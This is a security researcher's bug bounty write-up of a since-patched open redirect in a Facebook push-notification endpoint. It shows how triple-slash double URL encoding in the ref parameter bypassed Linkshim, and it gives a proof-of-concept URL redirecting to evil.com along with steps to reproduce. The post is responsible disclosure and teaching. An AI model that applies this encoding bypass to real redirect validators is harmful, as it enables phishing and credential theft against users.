---
date: "2025-11-16T23:12:36+08:00"
draft: false
title: "Linkshim Bypassed in Facebook Push Notication via Double URL Encoding"
summary: "A persistent open redirect vulnerability was discovered in Facebook’s Push Notification endpoint due to improper validation of the ?ref= parameter, allowing attackers to redirect users to malicious sites and potentially facilitate phishing attacks."

showToc: false
TocOpen: false
hidemeta: false
comments: false
disableHLJS: true
disableShare: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: false
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
markup: goldmark
goldmark:
  renderer:
    unsafe: true
---

### **Summary**
A **persistent open redirect** vulnerability was identified in Facebook’s mobile Push Notification endpoint, allowing attackers to bypass Linkshim and redirect users to malicious sites.

```
https://p.facebook.com/notifications/client/push/enabled/
```

The issue **was caused by improper validation** of the **`?ref=` parameter**, which allowed attackers to craft a URL that **forces Facebook to redirect users to an external website**. Although Facebook normally protects users through **Linkshim**, this specific endpoint **failed to sanitize deeply encoded redirect payloads**, resulting in a **successful open redirect**.

---

### **Root Cause Analysis**

When inspecting the source code of the push-notification page, a suspicious JavaScript object appeared:

```javascript
[ upsell: null, redirectUrl: "{}", enabledUrl: null ]
```

The presence of **`redirectUrl`** indicated that the endpoint supports redirect behavior when a **`?ref=` parameter** is supplied. Normally, Facebook sanitizes redirect parameters, but this endpoint **failed to validate deeply encoded values**.

Initial attempts such as:

```
?ref=https://evil.com
```

or:

```
?ref=https%3A%2F%2Fevil.com
```

did **not** trigger any redirect.

However, stacking additional encoded slashes finally bypassed validation:

```
https%3A%2F%2F%2Fevil%2ecom
```

This **broke the validation logic** and caused the browser to treat it as a valid external URL. As a result, Facebook rendered the page and **immediately redirected the user to the attacker-controlled domain**.

This enabled a **full open redirect** to any external website.


### **Attack Flow**

1. User clicks a **crafted URL** containing a malicious `ref` value.
2. The server reads the **unsanitized `ref` parameter** and assigns it to `redirectUrl`.
3. Facebook’s redirect logic attempts to **normalize the URL**.
4. **Over-encoded slashes** bypass the domain validation.
5. The browser interprets the payload as a **valid absolute external URL**.
6. The user is **redirected to an attacker-controlled site** (phishing, malware, credential theft).

### **Proof of Concept (PoC)**

A working payload that redirects users to `https://evil.com`:

```
https://p.facebook.com/notifications/client/push/enabled/?ref=https%3A%2F%2F%2Fevil%2ecom
```

Decoded, this becomes an unusual triple-slash pattern:

```
https:///evil.com
```

When evaluated by the browser, it becomes:

```
https://evil.com
```

and the **redirect triggers successfully**.

Attempts to perform XSS on this endpoint failed due to **Facebook’s strict hex-encoding filters and Linkshim**, but the **open redirect itself is still a security concern**, especially for phishing.


### **Steps to Reproduce**

1. Visit the endpoint:

   ```
   https://p.facebook.com/notifications/client/push/enabled/
   ```

2. Test a normal redirect:

   ```
   ?ref=https://example.com
   ```

   → **No redirect**

3. Test an encoded redirect:

   ```
   ?ref=https%3A%2F%2Fexample.com
   ```

   → **Still no redirect**

4. Use a **deeply encoded triple-slash payload**:

   ```
   ?ref=https%3A%2F%2F%2Fevil%2ecom
   ```

5. Full exploit URL:

   ```
   https://p.facebook.com/notifications/client/push/enabled/?ref=https%3A%2F%2F%2Fevil%2ecom
   ```

6. Result:

   ```
   https://evil.com
   ```

### **Disclosure Timeline**

* **September 22, 2020** — Reported to Facebook Whitehat
* **September 23, 2020** — Facebook team reproduced and began investigation
* **September 28, 2020** — Provided additional technical details
* **October 08, 2020** — Patch deployed and vulnerability fixed
* **October 21, 2020** — Bounty awarded
